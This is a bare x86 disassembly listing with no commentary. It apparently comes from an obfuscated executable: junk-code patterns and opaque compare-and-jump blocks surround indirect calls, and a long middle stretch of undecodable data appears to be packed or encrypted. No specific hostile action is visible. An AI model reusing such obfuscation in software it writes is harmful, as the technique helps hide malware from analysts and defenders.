  41c8d1:	sub    eax,DWORD PTR [ebp+eax*8+0x18]
  41c8d5:	xor    DWORD PTR [ebp+0x2488418f],eax
  41c8db:	popa   
  41c8dc:	jnp    0x41c885
  41c8de:	add    BYTE PTR [edi+edx*4+0x56],0x19
  41c8e3:	xchg   edx,eax
  41c8e4:	dec    edi
  41c8e5:	mov    bl,0x6d
  41c8e7:	cmp    eax,0x125c3495
  41c8ec:	mov    BYTE PTR [ebp-0x5c],bl
  41c8ef:	jmp    0x41c8bb
  41c8f1:	imul   ebp,DWORD PTR [edx+0x48ef328],0x10
  41c8f8:	mov    eax,0x162daace
  41c8fd:	out    dx,al
  41c8fe:	dec    eax
  41c8ff:	mov    al,ds:0xf33cd329
  41c904:	adc    ebp,DWORD PTR [edx+0x28d646ab]
  41c90a:	ds mov cl,0xb8
  41c90d:	sbb    BYTE PTR [ebx],bh
  41c90f:	add    BYTE PTR [eax],al
  41c911:	or     DWORD PTR ds:0x42857d,0x428415
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42847d
  41c923:	sbb    ecx,DWORD PTR ds:0x4284d9
  41c929:	mov    DWORD PTR ds:0x42847d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x428359
  41c93c:	sub    eax,DWORD PTR ds:0x428339
  41c942:	mov    ds:0x428359,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42857d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x428341,0x48a0
  41c974:	jmp    0x41c9c9
  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42857d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42847d
  41c99d:	sbb    DWORD PTR ds:0x428469,ecx
  41c9a3:	xor    DWORD PTR ds:0x42856d,edx
  41c9a9:	mov    DWORD PTR ds:0x4284e1,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x428455,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428565
  41c9bf:	sub    DWORD PTR ds:0x428431,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x42842d,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x4284c5,ecx
  41c9e5:	mov    DWORD PTR ds:0x428469,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428365,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x42842d,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x428359
  41ca23:	xor    ecx,DWORD PTR ds:0x42842d
  41ca29:	adc    DWORD PTR ds:0x42832d,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x42842d
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42847d,0x428461
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428361
  41ca4e:	xor    DWORD PTR ds:0x428551,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x428359
  41ca5f:	sub    ecx,DWORD PTR ds:0x4284e9
  41ca65:	mov    DWORD PTR ds:0x428359,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x428501,0xac
  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x428445,0x0
  41ca8c:	mov    DWORD PTR ds:0x428351,edi
  41ca92:	mov    DWORD PTR ds:0x42841d,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x428429,edx
  41caa3:	mov    DWORD PTR ds:0x4284f9,ebx
  41caa9:	cmp    DWORD PTR ds:0x428445,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x428501,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x428591
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x42845d,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x428551
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x428559
  41cae5:	and    ecx,DWORD PTR ds:0x428461
  41caeb:	mov    DWORD PTR ds:0x428559,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x428409
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41caea
  41cb1f:	push   esp
  41cb20:	cmp    BYTE PTR [edx-0x413fb615],dl
  41cb26:	dec    edx
  41cb27:	les    edi,FWORD PTR [esi-0x5fdfdf42]
  41cb2d:	fdiv   QWORD PTR [ebp-0x3dba9cfd]
  41cb33:	mov    ah,0xd9
  41cb35:	shl    DWORD PTR [ebx+edi*2],0xbc
  41cb39:	xor    dh,dh
  41cb3b:	pop    esi
  41cb3c:	push   ecx
  41cb3d:	call   0x6e08:0xb599874a
  41cb44:	shl    BYTE PTR [ebx],0x6d
  41cb47:	push   0x53
  41cb49:	pop    ebp
  41cb4a:	pop    ss
  41cb4b:	into   
  41cb4c:	dec    eax
  41cb4d:	lock loopne 0x41cae7
  41cb50:	dec    ebp
  41cb51:	ins    BYTE PTR es:[edi],dx
  41cb52:	dec    eax
  41cb53:	retf   
  41cb54:	push   edi
  41cb55:	mov    ebx,edi
  41cb57:	cmp    al,0xd2
  41cb59:	sub    BYTE PTR ds:0x16deaf5,0xe5
  41cb60:	(bad)  
  41cb61:	icebp  
  41cb62:	jle    0x41cb6b
  41cb64:	pop    esi
  41cb65:	adc    al,0x30
  41cb67:	scas   eax,DWORD PTR es:[edi]
  41cb68:	out    0xa2,eax
  41cb6a:	dec    ecx
  41cb6b:	lods   al,BYTE PTR ds:[esi]
  41cb6c:	shr    DWORD PTR [edx-0x1],cl
  41cb6f:	push   eax
  41cb70:	add    bl,BYTE PTR [ebx]
  41cb72:	jmp    0x51571649
  41cb77:	jb     0x41cbec
  41cb79:	jecxz  0x41cbb6
  41cb7b:	add    BYTE PTR [esi+0x29],al
  41cb7e:	mov    dl,0x32
  41cb80:	pop    ds
  41cb81:	aam    0xb3
  41cb83:	popf   
  41cb84:	push   ebp
  41cb85:	nop
  41cb86:	add    eax,0x72dd6e3c
  41cb8b:	sar    eax,0x40
  41cb8e:	push   ebx
  41cb8f:	inc    eax
  41cb90:	icebp  
  41cb91:	retf   0xee4c
  41cb94:	push   cs
  41cb95:	sahf   
  41cb96:	popf   
  41cb97:	mov    ch,0x3
  41cb99:	addr16 dec edi
  41cb9b:	push   edi
  41cb9c:	push   esi
  41cb9d:	cmp    al,0x18
  41cb9f:	mov    ds:0xc89f5854,al
  41cba4:	in     al,dx
  41cba5:	add    dl,dh
  41cba7:	or     DWORD PTR [bp+di+0x3d0b],eax
  41cbac:	sbb    dl,0x3
  41cbaf:	xchg   BYTE PTR [edx+0x30b834d7],dh
  41cbb5:	xchg   ebp,eax
  41cbb6:	test   BYTE PTR [edx-0x2e109175],0x6
  41cbbd:	in     al,dx
  41cbbe:	mov    dl,0xf8
  41cbc0:	pop    esp
  41cbc1:	cmc    
  41cbc2:	sub    eax,0xd331eabe
  41cbc7:	jp     0x41cbec
  41cbc9:	daa    
  41cbca:	pop    ds
  41cbcb:	xchg   ecx,eax
  41cbcc:	mov    al,ds:0x23996911
  41cbd1:	ja     0x41cc07
  41cbd3:	push   edi
  41cbd4:	xchg   BYTE PTR [ebx-0x45],dh
  41cbd7:	xlat   BYTE PTR ds:[ebx]
  41cbd8:	mov    ds:0x5a29ac8d,eax
  41cbdd:	push   es
  41cbde:	jle    0x41cb9a
  41cbe0:	adc    BYTE PTR [ebp+0x1c0ee5f3],dh
  41cbe6:	lds    esp,FWORD PTR [ecx-0xf7aa954]
  41cbec:	call   0xc1b3d332
  41cbf1:	mov    ah,0x5b
  41cbf3:	in     eax,0x35
  41cbf5:	dec    esp
  41cbf6:	and    BYTE PTR [esi],0xeb
  41cbf9:	dec    ebx
  41cbfa:	nop
  41cbfb:	jmp    0x6a683e6c
  41cc00:	jp     0x41cbb9
  41cc02:	shr    BYTE PTR [edi+0x76a90f33],0x50
  41cc09:	mov    bh,BYTE PTR [esi+ebx*4+0x25bf2f1c]
  41cc10:	loop   0x41cc47
  41cc12:	jge    0x41cbac
  41cc14:	adc    al,0xa7
  41cc16:	pop    esp
  41cc17:	and    DWORD PTR [eax-0x35bf26f7],edx
  41cc1d:	dec    ebp
  41cc1e:	hlt    
  41cc1f:	and    eax,0x9c3ea4e6
  41cc24:	std    
  41cc25:	repnz scas eax,DWORD PTR es:[edi]
  41cc27:	pop    ebp
  41cc28:	xor    BYTE PTR [edx-0x4c],0xdd
  41cc2c:	jmp    0x41ccac
  41cc2e:	xchg   esi,eax
  41cc2f:	nop
  41cc30:	(bad)  
  41cc31:	jmp    0x41cc2e
  41cc33:	mov    edi,0x174849f5
  41cc38:	sub    al,0x52
  41cc3a:	pop    eax
  41cc3b:	lods   al,BYTE PTR ds:[esi]
  41cc3c:	sbb    al,0xa3
  41cc3e:	loopne 0x41cc3f
  41cc40:	pop    ecx
  41cc41:	sbb    al,BYTE PTR [edi+0xc]
  41cc44:	inc    edx
  41cc45:	adc    ah,al
  41cc47:	and    DWORD PTR [eax+edi*2+0x23],eax
  41cc4b:	pop    esp
  41cc4c:	jb     0x41cc76
  41cc4e:	pushf  
  41cc4f:	jne    0x41cc70
  41cc51:	stc    
  41cc52:	xor    BYTE PTR [ebp+0x1],bl
  41cc55:	mov    ebx,0x80d8be52
  41cc5a:	pop    edi
  41cc5b:	inc    ebx
  41cc5c:	(bad)  
  41cc5d:	sbb    esi,DWORD PTR ds:[ebx]
  41cc60:	pop    edi
  41cc61:	sbb    ebx,DWORD PTR [ecx]
  41cc63:	mov    ebx,0x147e13ca
  41cc68:	add    BYTE PTR [ecx],0xff
  41cc6b:	(bad)  
  41cc6c:	and    BYTE PTR [esi+0x32b73c74],0x7f
  41cc73:	mov    bh,ch
  41cc75:	cmp    al,0x99
  41cc77:	retf   0x6c42
  41cc7a:	lahf   
  41cc7b:	pop    edi
  41cc7c:	add    al,0xec
  41cc7e:	jge    0x41cca3
  41cc80:	fcomp  DWORD PTR [esi+ecx*8+0x5d]
  41cc84:	jmp    0xd535:0x6a7e1d17
  41cc8b:	popf   
  41cc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc8d:	popa   
  41cc8e:	scas   eax,DWORD PTR es:[edi]
  41cc8f:	push   cs
  41cc90:	or     ch,ah
  41cc92:	jg     0x41ccc8
  41cc94:	jmp    DWORD PTR [ebx+eax*1-0x5f00e90f]
  41cc9b:	inc    ebp
  41cc9c:	enter  0x43de,0xb6
  41cca0:	sbb    dl,dl
  41cca2:	ja     0x41ccd5
  41cca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca5:	pushf  
  41cca6:	in     al,0xe0
  41cca8:	in     al,0xf8
  41ccaa:	mov    dh,0x8f
  41ccac:	sub    al,0x2c
  41ccae:	push   ebx
  41ccaf:	fs in  eax,0xf8
  41ccb2:	mov    ebp,gs
  41ccb4:	xchg   esp,eax
  41ccb5:	leave  
  41ccb6:	(bad)  
  41ccb7:	jo     0x41cc45
  41ccb9:	mov    ch,0x6d
  41ccbb:	xor    al,0xae
  41ccbd:	fwait
  41ccbe:	hlt    
  41ccbf:	jnp    0x41cd24
  41ccc1:	xor    ebp,edx
  41ccc3:	and    DWORD PTR [edx+0x34b77471],ebp
  41ccc9:	ds dec eax
  41cccb:	js     0x41cce2
  41cccd:	nop
  41ccce:	pop    ecx
  41cccf:	outs   dx,DWORD PTR ds:[esi]
  41ccd0:	xchg   ebx,eax
  41ccd1:	dec    edi
  41ccd2:	lahf   
  41ccd3:	cmp    ebp,esp
  41ccd5:	mov    esp,DWORD PTR [ebx+0xca52627]
  41ccdb:	adc    ebp,DWORD PTR [ecx+eiz*8]
  41ccde:	lods   eax,DWORD PTR ds:[esi]
  41ccdf:	jne    0x41cc97
  41cce1:	(bad)
  41cce4:	push   eax
  41cce5:	ins    BYTE PTR es:[edi],dx
  41cce6:	or     edi,DWORD PTR [edi-0x4c32e41c]
  41ccec:	pop    edx
  41cced:	std    
  41ccee:	es xchg edi,eax
  41ccf0:	loopne 0x41ccc3
  41ccf2:	test   al,0x43
  41ccf4:	dec    edx
  41ccf5:	shl    BYTE PTR [esp+ecx*8-0x37ffa901],0x4f
  41ccfd:	ins    BYTE PTR es:[edi],dx
  41ccfe:	in     al,0xbe
  41cd00:	sub    BYTE PTR [edi-0x1f],cl
  41cd03:	loopne 0x41ccfd
  41cd05:	in     eax,dx
  41cd06:	sbb    al,0x17
  41cd08:	inc    eax
  41cd09:	test   eax,0x8fc324f0
  41cd0e:	jg     0x41cd5c
  41cd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd11:	xor    al,0x85
  41cd13:	stc    
  41cd14:	cmp    DWORD PTR [eax+0x764390c5],0x988d1eba
  41cd1e:	push   edx
  41cd1f:	test   eax,0x49c2ef05
  41cd24:	mov    eax,0x2b76bc93
  41cd29:	scas   al,BYTE PTR es:[edi]
  41cd2a:	dec    ebp
  41cd2b:	cmp    dh,dl
  41cd2d:	(bad)  
  41cd2e:	retf   0xb84d
  41cd31:	in     eax,dx
  41cd32:	dec    esi
  41cd33:	pop    ebp
  41cd34:	sub    DWORD PTR [edx+0x47],eax
  41cd37:	shl    DWORD PTR [ecx+0x27c17c7d],0x6a
  41cd3e:	sbb    edi,DWORD PTR [ebx]
  41cd40:	frstpm(287 only) 
  41cd42:	rcr    BYTE PTR [ebx],cl
  41cd44:	sbb    ch,BYTE PTR [ebx+0x29d2c551]
  41cd4a:	xor    ah,BYTE PTR [eax]
  41cd4c:	cmp    al,0xc7
  41cd4e:	add    dh,BYTE PTR [esi+0x76]
  41cd51:	imul   BYTE PTR [edx+eax*8+0x11]
  41cd55:	adc    BYTE PTR [ebx+0x4a],bh
  41cd58:	adc    cl,dl
  41cd5a:	jmp    0x7d97:0x8cdfcc69
  41cd61:	pop    ss
  41cd62:	fst    DWORD PTR [esi+eiz*4-0x18]
  41cd66:	dec    eax
  41cd67:	sbb    DWORD PTR [edi+0x1d2a64e2],0xeecfd1ca
  41cd71:	clc    
  41cd72:	popa   
  41cd73:	ret    
  41cd74:	mov    esi,0x74350853
  41cd79:	or     BYTE PTR [edi+0x26afa6e7],bh
  41cd7f:	(bad)  
  41cd80:	mov    cs,WORD PTR [ecx]
  41cd82:	or     DWORD PTR [edx],esp
  41cd84:	mov    ebp,0xd8cd8232
  41cd89:	jbe    0x41ce0a
  41cd8b:	mov    DWORD PTR [ebp+0x6d62424d],ecx
  41cd91:	add    DWORD PTR [ebp-0x24d11432],eax
  41cd97:	push   eax
  41cd98:	sar    DWORD PTR [edi],0x70
  41cd9b:	push   ebx
  41cd9c:	shr    BYTE PTR [eax-0x53],1
  41cd9f:	(bad)  
  41cda0:	xlat   BYTE PTR ds:[ebx]
  41cda1:	xchg   ebp,eax
  41cda2:	punpcklbw mm3,mm4
  41cda5:	push   edi
  41cda6:	popf   
  41cda7:	mov    esi,0x32bc1742
  41cdac:	mov    bh,0xea
  41cdae:	jmp    0x97143f13
  41cdb3:	(bad)  
  41cdb4:	(bad)
  41cdb8:	stos   BYTE PTR es:[edi],al
  41cdb9:	mov    gs:0x9878e8c0,eax
  41cdbf:	into   
  41cdc0:	std    
  41cdc1:	cmp    edx,ecx
  41cdc3:	data16 aaa 
  41cdc5:	push   esp
  41cdc6:	mov    al,0x46
  41cdc8:	mov    WORD PTR [ecx],gs
  41cdca:	jae    0x41cdbc
  41cdcc:	daa    
  41cdcd:	lock dec edi
  41cdcf:	and    al,0x54
  41cdd1:	and    al,0xf3
  41cdd3:	dec    esi
  41cdd4:	enter  0x6894,0x71
  41cdd8:	leave  
  41cdd9:	or     al,0xd2
  41cddb:	add    BYTE PTR [ebx+0xb1a5960],cl
  41cde1:	test   BYTE PTR [ecx+0x3d],0x75
  41cde5:	imul   ebp,DWORD PTR [ebx-0x7db1373e],0xd9771384
  41cdef:	sti    
  41cdf0:	test   cl,bh
  41cdf2:	jbe    0x41cdfc
  41cdf4:	jl     0x41ce4d
  41cdf6:	and    al,0x35
  41cdf8:	fdivr  st,st(4)
  41cdfa:	js     0x41ce08
  41cdfc:	push   cs
  41cdfd:	pop    DWORD PTR [ecx-0x40704c70]
  41ce03:	sbb    dh,BYTE PTR [esi+0x11bc201d]
  41ce09:	adc    edi,eax
  41ce0b:	popa   
  41ce0c:	(bad)  
  41ce0d:	mov    ecx,0xf8d7a071
  41ce12:	jnp    0x41cdb6
  41ce14:	bnd jns 0x41cd9d
  41ce17:	stc    
  41ce18:	rcr    DWORD PTR [esi+edx*1],0xe2
  41ce1c:	fs jae 0x41cddd
  41ce1f:	mov    WORD PTR [esi+0x1b04f405],es
  41ce25:	sub    DWORD PTR [eax+0x52],0x2f
  41ce29:	mov    bh,0xa7
  41ce2b:	int3   
  41ce2c:	xchg   esp,ecx
  41ce2e:	mov    esp,0xffbedb07
  41ce33:	out    0x61,al
  41ce35:	test   DWORD PTR [esi+0x7f908214],eax
  41ce3b:	xchg   ah,dh
  41ce3d:	push   ebp
  41ce3e:	les    eax,FWORD PTR [eax+0x28]
  41ce41:	ja     0x41ce71
  41ce43:	mov    BYTE PTR ds:0xf8568c7d,bl
  41ce49:	jle    0x41cde7
  41ce4b:	cmc    
  41ce4c:	ins    BYTE PTR es:[edi],dx
  41ce4d:	test   DWORD PTR [ebx],eax
  41ce4f:	mov    ah,0x55
  41ce51:	pop    ebx
  41ce52:	mov    ds:0x7fdde850,eax
  41ce57:	(bad)  
  41ce58:	into   
  41ce59:	jns    0x41cde3
  41ce5b:	aam    0x7b
  41ce5d:	(bad)  
  41ce5e:	sbb    ch,BYTE PTR [edx-0x195ead84]
  41ce64:	test   BYTE PTR [eax-0x60],dh
  41ce67:	hlt    
  41ce68:	mov    ebp,ss
  41ce6a:	xlat   BYTE PTR ds:[ebx]
  41ce6b:	or     BYTE PTR [eax],ch
  41ce6d:	jb     0x41ced0
  41ce6f:	imul   eax,edx,0x68
  41ce72:	not    cl
  41ce74:	in     al,dx
  41ce75:	call   0xae4f:0xa81c5185
  41ce7c:	test   BYTE PTR [edi+0x723c231b],dl
  41ce82:	or     DWORD PTR [ebp-0x79],esi
  41ce85:	call   0xcd3aeea2
  41ce8a:	sbb    eax,0x7ee83aa7
  41ce8f:	cli    
  41ce90:	cmp    al,ch
  41ce92:	(bad)  
  41ce93:	ins    DWORD PTR es:[edi],dx
  41ce94:	cmp    ebp,edi
  41ce96:	push   edi
  41ce97:	mov    ds:0x71aa6440,al
  41ce9c:	daa    
  41ce9d:	or     eax,0x975430d1
  41cea2:	ret    
  41cea3:	clc    
  41cea4:	and    al,0x43
  41cea6:	iret   
  41cea7:	cmp    al,BYTE PTR [ebp-0x3ff9e13c]
  41cead:	pop    es
  41ceae:	stc    
  41ceaf:	fistp  QWORD PTR [ebp+0x7a634d2c]
  41ceb5:	sbb    ebx,0x46d30d26
  41cebb:	fdivr  DWORD PTR [eax]
  41cebd:	test   al,0xc2
  41cebf:	dec    eax
  41cec0:	cmp    BYTE PTR [ebp+ebx*1-0x581d1160],bh
  41cec7:	into   
  41cec8:	push   esi
  41cec9:	cdq    
  41ceca:	mov    fs,WORD PTR [edx]
  41cecc:	out    dx,al
  41cecd:	cld    
  41cece:	not    BYTE PTR [ecx+0x6f927939]
  41ced4:	jmp    0x5ba1:0xbd0f76d1
  41cedb:	mov    dl,0x83
  41cedd:	loope  0x41cf5e
  41cedf:	jg     0x41cea2
  41cee1:	inc    eax
  41cee2:	std    
  41cee3:	or     al,0xed
  41cee5:	mov    ah,0x33
  41cee7:	inc    edx
  41cee8:	and    ch,BYTE PTR [eax]
  41ceea:	or     eax,0x1df9635
  41ceef:	add    al,0xcf
  41cef1:	mov    cl,0x49
  41cef3:	xor    al,bh
  41cef5:	test   eax,ebx
  41cef7:	(bad)  
  41cef8:	(bad)  
  41cef9:	push   DWORD PTR [edi]
  41cefb:	jne    0x41cefd
  41cefd:	add    BYTE PTR [ecx],dh
  41ceff:	adc    eax,0x428479
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x4284e9,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x428451,0x428555
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x428551,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x4284d5,0x42833d
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428371,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428565,0x0
  41cf60:	mov    DWORD PTR ds:0x428501,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x428481
  41cf70:	mov    ecx,DWORD PTR ds:0x42847d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x4284f9
  41cf86:	mov    DWORD PTR ds:0x42834d,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428565,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x42855d
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x42833d
  41cfbb:	sbb    DWORD PTR ds:0x42857d,ecx
  41cfc1:	sub    DWORD PTR ds:0x42843d,ecx
  41cfc7:	not    DWORD PTR ds:0x4284f9
  41cfcd:	xor    DWORD PTR ds:0x4284f5,edi
  41cfd3:	mov    DWORD PTR ds:0x428435,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x428551
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428571,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x428449,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x42833d,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428575
  41d021:	mov    DWORD PTR ds:0x428441,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42846d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x42855d,edx
  41d040:	cmp    DWORD PTR ds:0x42833d,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428371
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x4284d9
  41d060:	mov    esi,DWORD PTR ds:0x428511
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x4284e9,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x428355,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428561
  41d07d:	sbb    DWORD PTR ds:0x428465,esi
  41d083:	sbb    DWORD PTR ds:0x428569,0x428419
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42836d,0x0
  41d096:	mov    DWORD PTR ds:0x4284f1,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x428501,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x42855d,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42836d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x42854d,edx
  41d0df:	xor    DWORD PTR ds:0x428359,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x428331,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x428449,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x428355,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428561
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x428339
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x4284ed,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x428355,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x428549
  41d15b:	add    esi,DWORD PTR ds:0x42846d
  41d161:	mov    DWORD PTR ds:0x428549,esi
  41d167:	mov    esi,DWORD PTR ds:0x428411
  41d16d:	and    esi,DWORD PTR ds:0x428439
  41d173:	mov    DWORD PTR ds:0x428411,esi
  41d179:	sbb    DWORD PTR ds:0x428481,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x42844d
  41d189:	add    DWORD PTR ds:0x4284d5,esi
  41d18f:	movzx  esi,WORD PTR ds:0x428449
  41d196:	adc    esi,DWORD PTR ds:0x428365
  41d19c:	mov    DWORD PTR ds:0x428449,esi
  41d1a2:	xor    DWORD PTR ds:0x428339,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x42835d,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x428345,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x42845d,0x0
  41d1d8:	mov    DWORD PTR ds:0x428551,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428479,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x428331
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42857d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x42845d,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428475
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x428405
  41d240:	adc    DWORD PTR ds:0x4284d5,esi
  41d246:	sub    DWORD PTR ds:0x4284e9,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428561,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x428439,0x0
  41d265:	mov    DWORD PTR ds:0x42835d,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x4284cd
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x42854d,ebx
  41d285:	movzx  eax,WORD PTR ds:0x42841d
  41d28c:	cmp    DWORD PTR ds:0x428439,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x428243
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x428549
  41d2be:	xor    DWORD PTR ds:0x4284e5,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428471,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x42855d,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428571
